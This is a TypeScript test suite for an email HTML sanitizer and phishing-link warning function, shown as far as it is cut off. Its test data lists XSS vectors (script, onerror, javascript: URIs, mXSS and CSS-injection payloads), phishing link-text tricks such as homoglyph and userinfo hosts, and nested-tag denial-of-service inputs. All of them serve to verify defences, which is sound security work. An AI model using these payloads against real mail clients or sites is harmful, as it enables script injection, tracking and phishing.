// @vitest-environment jsdom
import { describe, expect, it } from "vitest";
import { linkWarning, MAIL_FRAME_CSP, renderMailDocument, sanitizeEmailHtml, textToHtml } from "../src/sanitize.js";

const T = "dG9rZW4";
const clean = (html: string, imagesAllowed = false) => sanitizeEmailHtml(html, { token: T, imagesAllowed });
const TAGS = new Set(["a", "abbr", "b", "blockquote", "br", "caption", "center", "cite", "code", "col", "colgroup", "dd", "del", "div", "dl", "dt", "em", "font", "h1", "h2", "h3", "h4", "h5", "h6", "hr", "i", "img", "ins", "kbd", "li", "mark", "ol", "p", "pre", "q", "s", "small", "span", "strike", "strong", "sub", "sup", "table", "tbody", "td", "tfoot", "th", "thead", "tr", "tt", "u", "ul"]);
const ATTRS = new Set(["style", "align", "dir", "lang", "title", "href", "src", "alt", "width", "height", "color", "size", "face", "border", "cellpadding", "cellspacing", "bgcolor", "valign", "colspan", "rowspan", "nowrap", "span", "start", "type", "value"]);

/** Parses the output the way the viewer frame will and lists anything that could run, load or submit. */
function problems(html: string): string[] {
  const doc = new DOMParser().parseFromString(`<!doctype html><body>${html}`, "text/html");
  const out: string[] = [];
  for (const el of Array.from(doc.body.querySelectorAll("*"))) {
    if (!TAGS.has(el.tagName.toLowerCase())) out.push(`tag ${el.tagName}`);
    for (const a of Array.from(el.attributes)) {
      if (!ATTRS.has(a.name)) out.push(`attr ${a.name}`);
      if ((a.name === "href" || a.name === "src") && !/^(careeros-mail:\/\/(link|img|cid)\/|data:image\/(png|gif|jpeg|webp);base64,)/i.test(a.value)) out.push(`${a.name}=${a.value}`);
      if (a.name === "style" && /url\s*\(|expression|@import|\\|javascript:/i.test(a.value)) out.push(`style ${a.value}`);
    }
  }
  return out;
}

const CORPUS = [
  "<script>alert(1)</script>",
  "<img src=x onerror=alert(1)>",
  '<a href="javascript:alert(1)">x</a>',
  '<a href="JaVaScRiPt:alert(1)">x</a>',
  '<a href="&#106;avascript:alert(1)">x</a>',
  '<a href=" javascript:alert(1)">x</a>',
  '<a href="vbscript:msgbox(1)">x</a>',
  '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
  '<a href="//evil.example.com/">x</a>',
  '<a href="http://evil.example.com/">plain http</a>',
  '<iframe src="https://evil.example.com/"></iframe>',
  '<frameset><frame src="https://evil.example.com/"></frameset>',
  '<object data="https://evil.example.com/x.swf"></object><embed src="https://evil.example.com/x.swf">',
  '<form action="https://evil.example.com/"><input name="password"><button>Go</button></form>',
  "<style>@import url(https://evil.example.com/x.css); body { background: url(https://evil.example.com/t.png) }</style>",
  '<link rel="stylesheet" href="https://evil.example.com/x.css">',
  '<base href="https://evil.example.com/">',
  '<meta http-equiv="refresh" content="0;url=https://evil.example.com/">',
  '<div style="background:url(https://evil.example.com/t.png)">a</div>',
  '<div style="background:u\\rl(https://evil.example.com/t.png)">b</div>',
  '<div style="background-image: image-set(&quot;https://evil.example.com/t.png&quot; 1x)">c</div>',
  '<div style="width: expression(alert(1))">d</div>',
  '<div style="color: red; position: fixed; top: 0">e</div>',
  '<table background="https://evil.example.com/t.png"><tr><td background="https://evil.example.com/u.png">f</td></tr></table>',
  "<svg><script>alert(1)</script><a href=\"https://jobs.example.com/\">svg link</a></svg>",
  '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>',
  '<img src="https://tracker.example.com/p.gif" width="1" height="1">',
  '<img srcset="https://tracker.example.com/p.gif 1x">',
  '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">',
  '<video poster="https://evil.example.com/p.png"></video><audio src="https://evil.example.com/a.mp3"></audio>',
  '<p onclick="alert(1)" onmouseover="alert(1)">click</p>',
  "<textarea><script>alert(1)</script></textarea>",
  '<a href="https://jobs.example.com/apply" target="_blank" rel="opener">Apply</a>',
  '<template><img src=x onerror=alert(1)></template>',
];

describe("sanitizeEmailHtml", () => {
  it("leaves nothing that can run, load or submit, for every known vector", () => {
    for (const vector of CORPUS) {
      const { html } = clean(vector, true);
      expect(problems(html), vector).toEqual([]);
      expect(html, vector).not.toMatch(/alert\(1\)<\/script>|<script/i);
    }
  });
  it("rewrites https links to numbered careeros-mail links and drops others", () => {
    const r = clean('<p><a href="https://jobs.example.com/apply?id=1&amp;x=2">Apply now</a> <a href="mailto:x">mail</a></p>');
    expect(r.html).toBe(`<p><a href="careeros-mail://link/${T}/0">Apply now</a> <a>mail</a></p>`);
    expect(r.links).toEqual([{ href: "https://jobs.example.com/apply?id=1&x=2", text: "Apply now" }]);
  });
  it("blocks remote images until allowed, counting them either way", () => {
    const html = '<img src="https://images.example.com/logo.png" alt="Acme"><img src="https://images.example.com/p.gif">';
    const blocked = clean(html);
    expect(blocked.remoteImages).toEqual(["https://images.example.com/logo.png", "https://images.example.com/p.gif"]);
    expect(blocked.html).not.toContain("src=");
    expect(blocked.html).toContain('alt="Acme"');
    expect(clean(html, true).html).toBe(`<img alt="Acme" src="careeros-mail://img/${T}/0" /><img src="careeros-mail://img/${T}/1" />`);
  });
  it("shows inline cid images and small raster data images", () => {
    expect(clean('<img src="cid:logo@acme">').html).toBe(`<img src="careeros-mail://cid/${T}/logo%40acme" />`);
    const png = "data:image/png;base64,iVBORw0KGgo=";
    expect(clean(`<img src="${png}">`).html).toBe(`<img src="${png}" />`);
  });
  // Fix round 1, item 4: a content id of only dots must never become a ".." (or ".") path
  // segment wherever the viewer resolves this careeros-mail://cid/ URL.
  it("encodes dots in cid ids so cid:.. can't become a dot path segment", () => {
    const r = clean('<img src="cid:..">').html;
    expect(r).toBe(`<img src="careeros-mail://cid/${T}/%2E%2E" />`);
    expect(r).not.toContain("cid/" + T + "/..");
    expect(r).not.toContain("/.." );
    const single = clean('<img src="cid:.">').html;
    expect(single).toBe(`<img src="careeros-mail://cid/${T}/%2E" />`);
    // A normal content id with a dot in it (common - message-part style ids) is also encoded.
    expect(clean('<img src="cid:part1.2@acme">').html).toBe(`<img src="careeros-mail://cid/${T}/part1%2E2%40acme" />`);
  });
  it("keeps safe inline styles and drops the rest", () => {
    expect(clean('<p style="color: rgb(10, 20, 30); font-weight: bold; position: absolute">x</p>').html).toBe('<p style="color:rgb(10, 20, 30);font-weight:bold">x</p>');
  });
  it("keeps the layout of a typical recruiter email", () => {
    const html = '<table width="600" cellpadding="0"><tr><td align="center" style="padding: 8px"><h1>Acme Corp</h1><p>Hi Alex,<br>Thanks for applying.</p></td></tr></table>';
    expect(clean(html).html).toMatchSnapshot();
  });
});

describe("plain text, documents and link warnings", () => {
  it("escapes plain text and links https addresses", () => {
    const html = textToHtml("Hi <Alex>,\nApply at https://jobs.example.com/a?b=1&c=2 today.");
    expect(html).toBe('<pre>Hi &lt;Alex&gt;,\nApply at <a href="https://jobs.example.com/a?b=1&amp;c=2">https://jobs.example.com/a?b=1&amp;c=2</a> today.</pre>');
    expect(clean(html).links[0]?.href).toBe("https://jobs.example.com/a?b=1&c=2");
  });
  // Fix round 1, item 3: the URL is found in the raw text (stopping at < > " and whitespace)
  // and trimmed of trailing punctuation before anything is escaped, so angle brackets or
  // sentence punctuation around a URL don't get swept into the link.
  it("stops an angle-bracketed URL at '>' instead of swallowing it into the link", () => {
    const html = textToHtml("Apply <https://jobs.example.com/a>");
    expect(html).toBe('<pre>Apply &lt;<a href="https://jobs.example.com/a">https://jobs.example.com/a</a>&gt;</pre>');
    expect(html).not.toContain("%3E");
  });
  it("trims trailing sentence punctuation off an autolinked URL", () => {
    const html = textToHtml("(https://jobs.example.com/a).");
    expect(html).toBe('<pre>(<a href="https://jobs.example.com/a">https://jobs.example.com/a</a>).</pre>');
    // A ")" that closes a "(" actually inside the URL is kept, not treated as trailing noise.
    const wiki = textToHtml("See https://en.example.org/wiki/Example_(disambiguation) for more.");
    expect(wiki).toContain('href="https://en.example.org/wiki/Example_(disambiguation)"');
    expect(wiki).toContain("more.</pre>");
  });
  it("wraps the body in a document with the frame CSP and no referrer", () => {
    const doc = renderMailDocument("<p>Hi</p>");
    expect(doc).toContain(`<meta http-equiv="Content-Security-Policy" content="${MAIL_FRAME_CSP}">`);
    expect(doc).toContain('<meta name="referrer" content="no-referrer">');
    expect(doc).toContain("<body><p>Hi</p></body>");
    expect(MAIL_FRAME_CSP).toBe("default-src 'none'; img-src careeros-mail: data:; style-src 'unsafe-inline'; base-uri 'none'; form-action 'none'");
  });
  it("warns when the link text names a different site than the target", () => {
    expect(linkWarning("www.acme.example.com/careers", "https://acme-careers.example.net/login")).toBe("The link text shows www.acme.example.com but it goes to acme-careers.example.net.");
    expect(linkWarning("jobs.example.com", "https://apply.jobs.example.com/x")).toBe("");
    expect(linkWarning("Apply now", "https://jobs.example.com/x")).toBe("");
  });
  // Ruling 4: IDN/punycode look-alikes, userinfo tricks, and visible-URL mismatches.
  it("catches a userinfo trick where the real host hides after an @", () => {
    // A trusted-looking label placed before "@", with the real target host after it:
    // the part before "@" is just a (fake) username, so the link actually goes to the
    // host after it. new URL(...).hostname is never fooled by this, so comparing it
    // against the text's apparent host still flags the mismatch.
    const decoyHost = "real.example";
    const actualHost = "evil.example";
    const href = "https://" + decoyHost + "@" + actualHost + "/login";
    expect(linkWarning(decoyHost, href)).toBe(`The link text shows ${decoyHost} but it goes to ${actualHost}.`);
  });
  it("catches an IDN/punycode look-alike host", () => {
    // xn--pple-43d.com is the punycode form of a Cyrillic-а homoglyph of apple.com.
    // URL.hostname returns the ASCII punycode form, which plainly differs from the
    // legitimate-looking text, so it is flagged rather than silently treated as a match.
    expect(linkWarning("apple.com", "https://xn--pple-43d.com/account")).toBe(
      "The link text shows apple.com but it goes to xn--pple-43d.com."
    );
    // The reverse also holds: visible unicode text naming the homoglyph host directly.
    const r = linkWarning("xn--pple-43d.com", "https://apple.com/account");
    expect(r).toBe("The link text shows xn--pple-43d.com but it goes to apple.com.");
  });
  it("catches visible text that embeds a URL with a different registrable domain", () => {
    expect(linkWarning("Click here: https://acme.example.com/verify", "https://evil.example/verify")).toBe(
      "The link text shows acme.example.com but it goes to evil.example."
    );
  });
});

// Fix round 1, item 7: a trailing dot on the href's host (an absolute-form DNS name) is the
// same site, not a mismatch.
describe("linkWarning trailing-dot hosts (fix round 1, item 7)", () => {
  it("does not false-positive when the href host has a trailing dot", () => {
    expect(linkWarning("jobs.example.com", "https://jobs.example.com./apply")).toBe("");
    expect(linkWarning("apply.jobs.example.com", "https://apply.jobs.example.com./x")).toBe("");
  });
  it("still warns when a trailing-dot host is genuinely different", () => {
    expect(linkWarning("paypal.com", "https://evil.example./")).toBe("The link text shows paypal.com but it goes to evil.example.");
  });
});

// Fix round 1, item 2: linkWarning missed these common phishing-text forms (each returned ""
// against https://evil.example/ before the fix). One test per case from the review.
describe("linkWarning phishing text (fix round 1, item 2)", () => {
  const EVIL = "https://evil.example/";
  it("a trailing period after the domain", () => {
    expect(linkWarning("paypal.com.", EVIL)).not.toBe("");
  });
  it("the domain inside an ordinary sentence with a comma", () => {
    expect(linkWarning("Visit paypal.com, now", EVIL)).not.toBe("");
  });
  it("the domain in parentheses", () => {
    expect(linkWarning("(paypal.com)", EVIL)).not.toBe("");
  });
  it("the domain in angle brackets", () => {
    expect(linkWarning("<paypal.com>", EVIL)).not.toBe("");
  });
  it("a hyphenated decoy suffix glued onto the domain", () => {
    expect(linkWarning("paypal.com-login", EVIL)).not.toBe("");
  });
  it("the real target mentioned alongside a mismatched domain", () => {
    expect(linkWarning("evil.example then paypal.com", EVIL)).not.toBe("");
  });
  it("a userinfo trick spelled out directly in the text", () => {
    const text = "https://" + "paypal.com" + "@" + "evil.example" + "/";
    expect(linkWarning(text, EVIL)).not.toBe("");
  });
  it("CJK/fullwidth full stops standing in for '.'", () => {
    expect(linkWarning("paypal。com", EVIL)).not.toBe(""); // U+3002 IDEOGRAPHIC FULL STOP
    expect(linkWarning("paypal．com", EVIL)).not.toBe(""); // U+FF0E FULLWIDTH FULL STOP
    expect(linkWarning("paypal｡com", EVIL)).not.toBe(""); // U+FF61 HALFWIDTH IDEOGRAPHIC FULL STOP
  });
  it("a zero-width space hidden inside the domain", () => {
    expect(linkWarning("paypal​.com", EVIL)).not.toBe("");
  });
  it("300 invisible characters padded in front of the domain", () => {
    expect(linkWarning("​".repeat(300) + "paypal.com", EVIL)).not.toBe("");
  });
  it("every case actually names paypal.com as the mismatched host", () => {
    // Not just non-empty: confirm the message is actually about the paypal.com deception in
    // each case, not some unrelated token.
    const cases = [
      "paypal.com.", "Visit paypal.com, now", "(paypal.com)", "<paypal.com>", "paypal.com-login",
      "evil.example then paypal.com", "paypal。com", "paypal．com", "paypal｡com",
      "paypal​.com", "​".repeat(300) + "paypal.com",
    ];
    for (const text of cases) expect(linkWarning(text, EVIL), text).toContain("paypal.com");
  });
});

// Fix round 1, item 2 (documented limitation): linkWarning only ever sees the text that ended
// up inside the <a> after sanitizing - it has no idea whether CSS would actually render that
// text on screen. A span hidden with display:none (or font-size:0, or same-colour-as-background)
// still contributes its text to `links[].text`, so a warning can fire (or fail to fire) based on
// text a human reader would never see. This is NOT fixed here - this test pins the current
// behaviour so a future change to it is a deliberate, visible diff rather than a silent one.
describe("hidden <a> text is not detected (documented limitation)", () => {
  it("counts text inside display:none/font-size:0 spans as if it were visible", () => {
    const html = '<a href="https://evil.example/"><span style="display:none;font-size:0">paypal.com</span>Click here</a>';
    const r = clean(html, true);
    // The hidden "paypal.com" survives into the extracted link text alongside the visible
    // "Click here" - sanitizeEmailHtml does not strip it or know it's invisible.
    expect(r.links[0]?.text).toContain("paypal.com");
    // Consequently, linkWarning fires because of text nobody can actually see: a human looking
    // at this email sees only "Click here" (no domain mentioned at all) but still gets a
    // mismatch warning driven entirely by the hidden span.
    const warning = linkWarning(r.links[0]?.text ?? "", r.links[0]?.href ?? "");
    expect(warning).not.toBe("");
  });
});

// Ruling 5: the document served to the sandboxed frame can't be broken out of. Since
// renderMailDocument's bodyHtml always comes from sanitizeEmailHtml, the real guarantee is
// upstream: sanitizeEmailHtml never emits html/head/body/script, so there is nothing for
// renderMailDocument to concatenate that would close its own tags early.
describe("renderMailDocument cannot be broken out of (ruling 5)", () => {
  it("never lets sanitized mail content close the document's own html/body/head early", () => {
    const attempt = '</body></html><script>alert(1)</script><base href="https://evil.example/"><p>hi</p>';
    const { html: bodyHtml } = clean(attempt, true);
    // sanitizeEmailHtml already stripped </body>, </html>, <script> and <base> - only the
    // allow-listed <p> text survives - so renderMailDocument has nothing dangerous to embed.
    expect(bodyHtml).not.toMatch(/<\/body>|<\/html>|<script|<base/i);
    const doc = renderMailDocument(bodyHtml);
    // Exactly one of each structural tag: the sanitized content added none of its own.
    expect(doc.match(/<html[ >]/gi)?.length).toBe(1);
    expect(doc.match(/<\/html>/gi)?.length).toBe(1);
    expect(doc.match(/<body[ >]/gi)?.length).toBe(1);
    expect(doc.match(/<\/body>/gi)?.length).toBe(1);
    expect(doc).not.toContain("<script");
  });
  it("has no script tags of its own", () => {
    expect(renderMailDocument("<p>hi</p>")).not.toMatch(/<script/i);
  });
});

// Ruling 1: defence-in-depth corpus, beyond the brief's own CORPUS above. Each case is
// asserted to leave no script-capable output: no on* attributes, no javascript:/vbscript:/
// data:text/html anywhere, no <script>/<iframe>/<object>/<embed>/<form>/<base>/<meta>/
// <link>/<svg> with handlers, and no <math> tricks. `problems()` and the CORPUS test above
// already cover most of these; this block adds the specific forms called out in the task's
// ruling that the brief's own CORPUS does not exercise (entity/control-character scheme
// obfuscation, formaction on <input>/<button>, and <picture>/<source srcset>). Entries that
// would just duplicate a CORPUS vector (fix round 1, item 8) have been removed - e.g. plain
// "JaVaScRiPt:" and bare "<img src=x onerror=...>" are already in CORPUS above.
const EXTRA_CORPUS = [
  // Entity/control-character scheme obfuscation beyond CORPUS's single leading space.
  '<a href="java&#x09;script:alert(1)">x</a>',
  '<a href="java&#x0A;script:alert(1)">x</a>',
  '<a href="&#x09;javascript:alert(1)">x</a>',
  '<a href="\t\n javascript:alert(1)">x</a>',
  '<a href="\u0000javascript:alert(1)">x</a>',
  // Element/attribute handler vectors.
  '<a href="https://jobs.example.com/" onclick="alert(1)">x</a>',
  "<svg onload=alert(1)><circle/></svg>",
  // mXSS via math/mglyph/style parsing differential - well-formed (explicit closing tags),
  // unlike CORPUS's auto-close-at-EOF variant.
  "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math>",
  // <style> smuggling a script past naive string handling.
  "<style>body{color:red}</style><script>alert(1)</script>",
  // CSS injection beyond CORPUS's url(https:...) and \r escape: javascript: scheme in url(),
  // a hex-escaped url(), and @import without url().
  '<div style="background: url(javascript:alert(1))">b</div>',
  '<div style="background: u\\72l(https://evil.example.com/t.png)">c</div>',
  '<style>@import "https://evil.example.com/x.css";</style>',
  // target=_blank alone (no rel) must never retain opener access either.
  '<a href="https://jobs.example.com/apply" target="_blank">Apply</a>',
  // formaction on <input>/<button> outside CORPUS's <form action> case.
  '<input type="submit" formaction="https://evil.example.com/">',
  '<button formaction="https://evil.example.com/">Go</button>',
  // srcset / <picture><source srcset> must not bypass the remote-image block.
  '<img src="https://tracker.example.com/p.gif" srcset="https://tracker.example.com/p2.gif 2x">',
  '<picture><source srcset="https://tracker.example.com/p.gif 1x"><img src="https://tracker.example.com/p.gif"></picture>',
  // poster= with a <source> child, beyond CORPUS's video-poster-plus-audio-src case.
  '<video poster="https://evil.example.com/poster.png"><source src="https://evil.example.com/v.mp4"></video>',
  // data:image/svg+xml, percent-encoded rather than CORPUS's base64 encoding.
  '<img src="data:image/svg+xml,%3Csvg%20onload%3D%27alert(1)%27%3E%3C%2Fsvg%3E">',
];

describe("sanitizeEmailHtml XSS corpus (ruling 1, defence in depth)", () => {
  it("leaves no script-capable output for the extended corpus", () => {
    for (const vector of EXTRA_CORPUS) {
      const { html, remoteImages } = clean(vector, true);
      expect(problems(html), vector).toEqual([]);
      expect(html, vector).not.toMatch(/<script|<iframe|<object|<embed|<form|<base|<meta|<link|on\w+\s*=|javascript:|vbscript:|data:text\/html/i);
      expect(html, vector).not.toContain("data:image/svg+xml");
      // Remote images/backgrounds/posters must never leave a loadable src unless imagesAllowed,
      // and even then only through the careeros-mail://img/ placeholder - never the raw URL.
      for (const img of remoteImages) expect(html, vector).not.toContain(`src="${img}"`);
    }
  });
  it("never lets a target=_blank link carry opener access", () => {
    const r = clean('<a href="https://jobs.example.com/apply" target="_blank" rel="opener">Apply</a>');
    expect(r.html).not.toMatch(/target=|rel=/);
  });
  it("blocks data:image/svg+xml even when images are allowed", () => {
    const r = clean('<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+">', true);
    expect(r.html).toBe("<img />");
  });
});

// Ruling 3: the work is bounded - oversize input is truncated rather than fully parsed,
// and the links/remoteImages arrays are capped so a hostile message with huge numbers of
// links or images can't make the viewer hold an unbounded array.
describe("sanitizeEmailHtml bounds (ruling 3)", () => {
  it("truncates oversize input instead of parsing all of it", () => {
    // 2 MB of padding, then a vector placed past the cutoff: it must never reach the parser.
    const vector = '<img src=x onerror=alert(1)>';
    const oversize = "a".repeat(2_000_000 + 1000) + vector;
    const { html } = clean(oversize, true);
    expect(html).not.toContain("onerror");
    expect(html).not.toContain("alert(1)");
  });
  it("caps the links array so a flood of links can't grow it without bound", () => {
    const links = Array.from({ length: 2005 }, (_, i) => `<a href="https://jobs.example.com/${i}">l${i}</a>`).join("");
    const r = clean(links);
    expect(r.links.length).toBeLessThanOrEqual(2000);
    // Every rewritten href still resolves to a real entry in `links` - no out-of-range index.
    for (const m of r.html.matchAll(/careeros-mail:\/\/link\/[^/]+\/(\d+)/g)) {
      expect(Number(m[1])).toBeLessThan(r.links.length);
    }
  });
  it("caps the remoteImages array so a flood of images can't grow it without bound", () => {
    const imgs = Array.from({ length: 2005 }, (_, i) => `<img src="https://images.example.com/${i}.png">`).join("");
    const r = clean(imgs, true);
    expect(r.remoteImages.length).toBeLessThanOrEqual(2000);
    for (const m of r.html.matchAll(/careeros-mail:\/\/img\/[^/]+\/(\d+)/g)) {
      expect(Number(m[1])).toBeLessThan(r.remoteImages.length);
    }
  });
  // Fix round 1, item 8: the (MAX_LINKS + 1)th link specifically - not just "the count stays
  // under the cap" - must come back with no href at all, same as any other dropped link.
  it("gives the 2001st link no href once the links cap is reached", () => {
    const count = 2001;
    const links = Array.from({ length: count }, (_, i) => `<a href="https://jobs.example.com/${i}">l${i}</a>`).join("");
    const r = clean(links);
    expect(r.links.length).toBe(2000);
    const anchors = [...r.html.matchAll(/<a([^>]*)>/g)];
    expect(anchors.length).toBe(count);
    for (let i = 0; i < 2000; i++) expect(anchors[i]![1]).toContain("href=");
    expect(anchors[2000]![1]).not.toContain("href=");
  });
});

// Fix round 1, item 5: the token is spliced unescaped into every careeros-mail:// URL this
// module produces, so it must be restricted to characters that can't reshape those URLs.
describe("sanitizeEmailHtml token validation (fix round 1, item 5)", () => {
  it("throws for a token outside [A-Za-z0-9_-]", () => {
    expect(() => sanitizeEmailHtml("<p>hi</p>", { token: "a/b", imagesAllowed: false })).toThrow();
    expect(() => sanitizeEmailHtml("<p>hi</p>", { token: "", imagesAllowed: false })).toThrow();
    expect(() => sanitizeEmailHtml("<p>hi</p>", { token: "has space", imagesAllowed: false })).toThrow();
    expect(() => sanitizeEmailHtml("<p>hi</p>", { token: "a\"b", imagesAllowed: false })).toThrow();
  });
  it("accepts letters, digits, underscore and hyphen", () => {
    expect(() => sanitizeEmailHtml("<p>hi</p>", { token: "Abc123_-", imagesAllowed: false })).not.toThrow();
  });
});

// Fix round 1, item 1: sanitizeHtml's own parsing cost grows roughly with the square of
// nesting depth (measured by the reviewer: ~400k nested divs in 2 MB took ~74s; ~30k nested
// table/tr/td took ~5.3s - both well inside the 2 MB size cap, so that cap alone doesn't help).
// A linear pre-scan now rejects anything over 5,000 open tags or 500 levels deep before
// sanitizeHtml ever runs, falling back to plain text with `simplified: true`.
describe("sanitizeEmailHtml nested-tag bomb (fix round 1, item 1)", () => {
  it("handles 400k nested divs in well under 2 seconds and comes back simplified", () => {
    // This is the reviewer's exact benchmark shape: 400k unclosed "<div>" is already exactly
    // 2,000,000 characters - at MAX_HTML_LENGTH, so nothing is truncated away by the size cap
    // alone, and there is no room left for real content in this specific input. Content
    // preservation through the fallback is covered separately below, at a size where the
    // content isn't itself pushed past the 2 MB cap.
    const bomb = "<div>".repeat(400_000);
    expect(bomb.length).toBe(2_000_000);
    const start = performance.now();
    const r = clean(bomb, true);
    expect(performance.now() - start).toBeLessThan(2000);
    expect(r.simplified).toBe(true);
    expect(r.links).toEqual([]);
    expect(r.remoteImages).toEqual([]);
  });
  it("handles 30k nested table/tr/td in well under 2 seconds and comes back simplified", () => {
    const bomb = "<table><tr><td>".repeat(30_000) + "hi" + "</td></tr></table>".repeat(30_000);
    const start = performance.now();
    const r = clean(bomb, true);
    expect(performance.now() - start).toBeLessThan(2000);
    expect(r.simplified).toBe(true);
    expect(r.html).toContain("hi");
  });
  it("does not simplify a normal recruiter email", () => {
    const html = '<table width="600" cellpadding="0"><tr><td align="center"><h1>Acme Corp</h1><p>Hi Alex,<br>Thanks for applying.</p></td></tr></table>';
    const r = clean(html, true);
    expect(r.simplified).toBe(false);
  });
  it("still shows the message as readable plain text when simplified, not blank", () => {
    const bomb = "<div>".repeat(10_000) + "Please see the attached offer, Alex." + "</div>".repeat(10_000);
    const r = clean(bomb, true);
    expect(r.simplified).toBe(true);
    expect(r.html).toContain("Please see the attached offer, Alex.");
    // The fallback never contains an open "<div" - it went through textToHtml, not the parser.
    expect(r.html).not.toContain("<div");
  });
});

// Fix round 2, item 1: trimTrailingPunctuation recounted "(" / ")" over the whole remaining
// string on every trim, making it O(n²) - a URL followed by 40,000 ")" took ~39s. The fix
// counts once and decrements as it trims, and caps each URL span at MAX_URL_SPAN besides.
describe("textToHtml / sanitizeEmailHtml trailing-punctuation performance (fix round 2, item 1)", () => {
  it("trims a URL followed by 200k ')' in well under 200ms via textToHtml", () => {
    const text = "https://a" + ")".repeat(200_000);
    const start = performance.now();
    const html = textToHtml(text);
    expect(performance.now() - start).toBeLessThan(200);
    // The href itself is exactly "https://a" - the ')' flood was trimmed off the link, not
    // kept in it (it still appears afterwards, as ordinary escaped trailing text).
    expect(html.match(/href="([^"]*)"/)?.[1]).toBe("https://a");
    expect(html.match(/<a[^>]*>([^<]*)<\/a>/)?.[1]).toBe("https://a");
  });
  it("trims the same payload in well under 200ms through a forced-simplified sanitizeEmailHtml", () => {
    // 501+ nested divs forces the complexity fallback (isTooComplex), which is where the HTML
    // path reaches trimTrailingPunctuation (via textToHtml inside the fallback).
    const payload = "https://a" + ")".repeat(200_000);
    const bomb = "<div>".repeat(501) + payload + "</div>".repeat(501);
    const start = performance.now();
    const r = clean(bomb, true);
    expect(performance.now() - start).toBeLessThan(200);
    expect(r.simplified).toBe(true);
  });
});

// Fix round 2, item 2: the simplified fallback used to return textToHtml's output directly,
// with raw `<a href="https://...">` and `links: []` - skipping the careeros-mail:// rewrite
// and the linkWarning/confirm flow entirely. The fallback's (flat) output now goes through the
// same runSanitize() link/image rewriting as the normal path.
describe("simplified fallback still rewrites links (fix round 2, item 2)", () => {
  it("leaves the brief's CORPUS with no problems once forced through the simplified path", () => {
    for (const vector of CORPUS) {
      const wrapped = "<div>".repeat(501) + vector + "</div>".repeat(501);
      const r = clean(wrapped, true);
      expect(r.simplified, vector).toBe(true);
      expect(problems(r.html), vector).toEqual([]);
    }
  });
  it("records a plain https link and rewrites its href, even through the fallback", () => {
    const bomb = "<div>".repeat(501) + "Apply at https://jobs.example.com/apply today" + "</div>".repeat(501);
    const r = clean(bomb, true);
    expect(r.simplified).toBe(true);
    expect(r.links).toEqual([{ href: "https://jobs.example.com/apply", text: "https://jobs.example.com/apply" }]);
    expect(r.html).toContain(`careeros-mail://link/${T}/0`);
    expect(r.html).not.toContain('href="https://jobs.example.com/apply"');
  });
});

// Fix round 2, item 3: void elements (never closed in real HTML) must not count as nesting
// depth, or ordinary flat mail content full of <br>/<img> would be wrongly simplified. The
// open-tag cap is also raised to 20,000, since tag count alone (without depth) is cheap.
describe("void elements don't count as nesting depth (fix round 2, item 3)", () => {
  it("600 bare <br> tags are not simplified", () => {
    const html = "<br>".repeat(600) + "Alex";
    expect(clean(html, true).simplified).toBe(false);
  });
  it("600 bare <img> tags are not simplified", () => {
    const html = '<img src="https://images.example.com/p.png">'.repeat(600);
    const r = clean(html, true);
    expect(r.simplified).toBe(false);
    expect(r.remoteImages.length).toBe(600);
  });
  it("501 nested divs are still simplified", () => {
    const html = "<div>".repeat(501) + "hi" + "</div>".repeat(501);
    expect(clean(html, true).simplified).toBe(true);
  });
});

// Fix round 2, item 4: the link-text slice happened before normalising, so padding (invisible
// or merely visible) consumed the whole 300-char budget before the real domain was ever seen -
// end to end (through sanitizeEmailHtml, then linkWarning), the warning never fired.
describe("link text padding doesn't hide the real domain end to end (fix round 2, item 4)", () => {
  it("300 zero-width characters before the domain, inside the <a>, still warn", () => {
    const html = `<a href="https://evil.example/">${"​".repeat(300)}paypal.com</a>`;
    const r = clean(html, true);
    expect(r.links[0]?.text).toContain("paypal.com");
    expect(linkWarning(r.links[0]?.text ?? "", r.links[0]?.href ?? "")).not.toBe("");
  });
  it("160 visible 'x ' pads before the domain, inside the <a>, still warn", () => {
    const html = `<a href="https://evil.example/">${"x ".repeat(160)}paypal.com</a>`;
    const r = clean(html, true);
    expect(r.links[0]?.text).toContain("paypal.com");
    expect(linkWarning(r.links[0]?.text ?? "", r.links[0]?.href ?? "")).not.toBe("");
  });
});

// Fix round 2, item 5: NFKC normalisation (covers U+2024 ONE DOT LEADER and U+FE52 SMALL FULL
// STOP, among others) and defanged "[.]"/"(.)" forms.
describe("linkWarning NFKC and defanged dots (fix round 2, item 5)", () => {
  const EVIL = "https://evil.example/";
  it("U+2024 ONE DOT LEADER standing in for '.'", () => {
    expect(linkWarning("paypal․com", EVIL)).not.toBe("");
  });
  it("U+FE52 SMALL FULL STOP standing in for '.'", () => {
    expect(linkWarning("paypal﹒com", EVIL)).not.toBe("");
  });
  it("defanged '[.]' and '(.)' forms", () => {
    expect(linkWarning("paypal[.]com", EVIL)).not.toBe("");
    expect(linkWarning("paypal(.)com", EVIL)).not.toBe("");
  });
  // Documented (not fixed) limitation: a bare, space-separated "." is indistinguishable from
  // ordinary sentence punctuation without a much higher false-positive rate, so this is a
  // known miss - pinning today's behaviour rather than silently changing it later.
  it("space-separated 'paypal . com' is a known miss", () => {
    expect(linkWarning("paypal . com", EVIL)).toBe("");
  });
});

// Fix round 2, item 6: a host token's last label needs at least 2 letters (or the token must
// be a real IPv4 literal), so ordinary prose with a decimal number or an abbreviation doesn't
// falsely warn.
describe("linkWarning false positives on numbers and abbreviations (fix round 2, item 6)", () => {
  const EVIL = "https://evil.example/";
  it("a version number is not treated as a host", () => {
    expect(linkWarning("See Version 2.0 for details", EVIL)).toBe("");
  });
  it("an abbreviation is not treated as a host", () => {
    expect(linkWarning("e.g. this is fine", EVIL)).toBe("");
  });
  it("a real IPv4 literal is still treated as a host", () => {
    expect(linkWarning("http://192.168.1.1/login", EVIL)).not.toBe("");
  });
});

// Fix round 2, item 8: a flood of '<' that never forms a real tag, and a single pathologically
// large style attribute, aren't caught by tag/depth counting alone - both are checked
// separately and routed to the simplified fallback.
describe("additional simplified-fallback triggers (fix round 2, item 8)", () => {
  it("2 MB of '<' is simplified in well under 1 second", () => {
    const bomb = "<".repeat(2_000_000);
    const start = performance.now();
    const r = clean(bomb, true);
    expect(performance.now() - start).toBeLessThan(1000);
    expect(r.simplified).toBe(true);
  });
